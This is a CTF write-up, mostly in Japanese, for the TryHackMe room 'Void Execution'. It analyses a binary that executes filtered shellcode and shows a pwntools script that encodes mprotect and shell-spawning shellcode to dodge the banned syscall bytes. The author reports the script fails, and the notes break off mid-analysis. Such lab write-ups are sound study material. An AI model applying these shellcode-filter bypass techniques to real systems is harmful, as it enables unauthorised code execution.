# Void Execution CTF

https://tryhackme.com/room/hfb1voidexecution

```sh
$ ls
ld-linux-x86-64.so.2  libc.so.6  voidexec
```

```sh
$ pwn checksec ./voidexec
[*] '/home/kali/ctf/void/voidexec'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```c
undefined8 main(void)
{
  char cVar1;
  code *__s;

  setup();
  __s = (code *)mmap((void *)0xc0de0000,100,7,0x22,-1,0);
  memset(__s,0,100);
  puts("\nSend to void execution: ");
  read(0,__s,100);
  puts("\nvoided!\n");
  cVar1 = forbidden(__s);
  if (cVar1 != '\0') {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  mprotect(__s,100,4);
  (*__s)();
  return 0;
}

undefined8 forbidden(long param_1)
{
  ulong local_18;

  local_18 = 0;
  while( true ) {
    if (0x62 < local_18) {
      return 0;
    }
    if (*(char *)(local_18 + param_1) == '\x0f') break;
    if ((*(char *)(local_18 + param_1) == -0x33) && (*(char *)(param_1 + local_18 + 1) == -0x80)) {
      puts("Forbidden!");
      return 1;
    }
    local_18 = local_18 + 1;
  }
  puts("Forbidden!");
  return 1;
}
```

- forbidden 関数で禁止されているバイトがある
- mprotect(\_\_s,100,4); は実行専用領域。（読み書き禁止）

下記の 3 種類はすべて禁止されているということ

1. \x0f\x05 syscall 命令 システムコール（例：execve など）
2. \x0f\x34 sysenter 命令 古い Linux カーネル向けシステムコール
3. \xcd\x80（= -0x33 と-0x80） int 0x80 命令 もっと古い Linux システムコール

禁止バイトを回避するために下記の方法を使うと、

```python
encoded_shellcode = encode(shellcode, avoid=b"\x0f\xcd")
```

このような XOR エンコードが生成され、読み書き禁止の制限に違反する。

```
0xc0de0014    stosb  byte ptr [rdi], al
```

禁止バイトを使わずにシェルを起動する方法を調べたが見つからなかった。

では、mprotectを再度呼び出して読み書き可能に戻すことは可能か？  
→ shellcraft.mprotectがあることを知る。

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

#r = remote("localhost", 5002)
p = process('./voidexec')

mprotect_code = shellcraft.mprotect(0xc0de0000, 100, 7)
shellcode = shellcraft.sh()

full_code = asm(mprotect_code + shellcode)

encoded_shellcode = encode(full_code, avoid=b"\x0f\xcd")
print(encoded_shellcode)

p.recvuntil(b"Send to void execution: \n")
p.sendline(encoded_shellcode)
p.interactive()
```

しかし、これも結局[内部的には](https://github.com/arthaud/python3-pwntools/blob/7519197918/pwnlib/shellcraft/templates/amd64/linux/mprotect.asm) syscall を呼び出しているので最後に `\x0f\x05` が含まれてしまうし、avoid=b"\x0f\xcd"を使ったら同じように読み書き禁止のためセグメンテーションエラーになる。

このcallにステップインした直後のレジスタを見ると、
```c
(*__s)();
```

RCX にmprotect+11のアドレスが入っていることが分かる。

```
 RCX  0x7ffff7d1e8bb (mprotect+11) ◂— cmp rax, -0xfff
```
